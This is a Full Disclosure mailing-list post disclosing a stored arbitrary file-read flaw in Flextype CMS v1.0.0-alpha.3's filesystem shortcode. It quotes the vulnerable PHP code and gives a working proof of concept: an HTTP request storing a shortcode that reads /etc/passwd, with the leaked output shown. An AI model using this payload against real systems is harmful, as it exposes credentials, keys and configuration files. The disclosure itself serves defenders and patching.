---
title: Flextype v1.0.0-alpha.3 Stored Filesystem Shortcode Allows Arbitrary File Read
url: https://seclists.org/fulldisclosure/2026/Sep/25
source: Full Disclosure
date: 2026-09-04
fetch_date: 2026-09-05T06:30:32.203346
---

# Flextype v1.0.0-alpha.3 Stored Filesystem Shortcode Allows Arbitrary File Read

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)

[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)

## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](24)
[By Date](date.html#25)
[![Next](/images/right-icon-16x16.png)](26)

[![Previous](/images/left-icon-16x16.png)](24)
[By Thread](index.html#25)
[![Next](/images/right-icon-16x16.png)](26)

![](/shared/images/nst-icons.svg#search)

# Flextype v1.0.0-alpha.3 Stored Filesystem Shortcode Allows Arbitrary File Read

---

*From*: Ron E <ronaldjedgerson () gmail com>
*Date*: Sun, 30 Aug 2026 22:55:45 -0400

---

```
Description

Flextype CMS v1.0.0-alpha.3 contains an arbitrary file-read vulnerability
in its stored shortcode processing functionality. Attacker-controlled entry
fields are automatically processed by the shortcode parser when global
shortcode processing is enabled.

The built-in filesystem shortcode accepts a file path and returns the
contents of the specified file without restricting the path to an approved
application directory.

An attacker capable of storing shortcode syntax within an entry can
therefore cause Flextype to read arbitrary files accessible to the PHP
process.

Testing confirmed exploitation by storing a filesystem shortcode
referencing /etc/passwd. Flextype returned the contents of /etc/passwd
while processing the entry and returned the file contents again during
subsequent normal retrieval of the stored entry.
Impact

An attacker can retrieve arbitrary files readable by the Flextype PHP
process.

Potentially exposed information includes application configuration,
credentials, API keys, database connection information, source code,
operating-system files, and other application secrets.

Unlike the previously identified ExpressionsDirective file-read
vulnerability, this vulnerability reaches filesystem functionality through
Flextype's shortcode parser and FilesystemShortcode implementation.
DetailsAutomatic Shortcode Processing

Entry fields are passed to the shortcode parser:

if (is_string($field['value'])) {
    if (strings($field['value'])->contains('@shortcodes')) {
        $field['value'] = strings(
            parsers()->shortcodes()->parse($field['value'])
        )->replace('@shortcodes', '')->trim()->toString();
    } elseif (
        registry()->get(
            'flextype.settings.entries.directives.shortcodes.enabled_globally'
        )
    ) {
        $field['value'] = parsers()->shortcodes()->parse($field['value']);
    }
}

Filesystem Shortcode

The filesystem shortcode accepts the supplied file parameter and returns
its contents:

if (
    collection(array_keys($params))
        ->filter(static fn ($v) => $v === 'get')
        ->count() > 0 &&
    isset($params['file']) &&
    registry()->get(
        'flextype.settings.parsers.shortcodes.shortcodes.filesystem.get.enabled'
    ) === true
) {
    $file = parsers()->shortcodes()->parse($params['file']);

    return filesystem()->file($file)->exists()
        ? filesystem()->file($file)->get()
        : '';
}

No filesystem containment restriction is applied to $file before it is read.
Proof of Concept

The following entry contains a filesystem shortcode targeting /etc/passwd:

POST /api/v1/entries HTTP/1.1
Host: 127.0.0.1:18086
Content-Type: application/json

{"token":"lab-token","access_token":"password","id":"shortcode-file-proof","data":{"title":"(filesystem
get file:'/etc/passwd')"}}

Flextype returned the contents of /etc/passwd within the processed title:

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
...

The stored entry was subsequently requested normally:

GET /api/v1/entries?token=lab-token&id=shortcode-file-proof HTTP/1.1
Host: 127.0.0.1:18086

The response again contained /etc/passwd, demonstrating stored arbitrary
file read during normal entry processing.
Root Cause

The vulnerability occurs because attacker-controllable stored entry content
is interpreted by the shortcode parser and the filesystem shortcode accepts
unrestricted filesystem paths.

The affected code ultimately performs:

filesystem()->file($file)->get()

without verifying that the canonicalized path resides within an explicitly
permitted directory.

Ron Edgerson
Vulnerability Researcher & Exploit Developer

CVE Research | Binary Exploitation | Application & Systems Security
Responsible Disclosure • Proof-of-Concept Development

🌐 https://github.com/ob1sec
🔗 https://www.linkedin.com/in/ronedgerson1
<https://linkedin.com/in/yourhandle>
_______________________________________________
Sent through the Full Disclosure mailing list
https://nmap.org/mailman/listinfo/fulldisclosure
Web Archives & RSS: https://seclists.org/fulldisclosure/
```

---

[![Previous](/images/left-icon-16x16.png)](24)
[By Date](date.html#25)
[![Next](/images/right-icon-16x16.png)](26)

[![Previous](/images/left-icon-16x16.png)](24)
[By Thread](index.html#25)
[![Next](/images/right-icon-16x16.png)](26)

### Current thread:

* **Flextype v1.0.0-alpha.3 Stored Filesystem Shortcode Allows Arbitrary File Read** *Ron E (Sep 03)*

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldisclosure/)* [Open Source Security](https://seclists.org/oss-sec/)* [BreachExchange](https://seclists.org/dataloss/)

## [Security Tools](https://sectools.org)

* [Vuln scanners](https://sectools.org/tag/vuln-scanners/)* [Password audit](https://sectools.org/tag/pass-audit/)* [Web scanners](https://sectools.org/tag/web-scanners/)* [Wireless](https://sectools.org/tag/wireless/)* [Exploitation](https://sectools.org/tag/sploits/)

## [About](https://insecure.org/)

* [About/Contact](https://insecure.org/fyodor/)* [Privacy](https://insecure.org/privacy.html)* [Advertising](https://insecure.org/advertising.html)* [Nmap Public Source License](https://nmap.org/npsl/)

[![](/shared/images/nst-icons.svg#twitter)](https://twitter.com/nmap "Visit us on Twitter")
[![](/shared/images/nst-icons.svg#facebook)](https://facebook.com/nmap "Visit us on Facebook")
[![](/shared/images/nst-icons.svg#github)](https://github.com/nmap/ "Visit us on Github")
[![](/shared/images/nst-icons.svg#reddit)](https://reddit.com/r/nmap/ "Discuss Nmap on Reddit")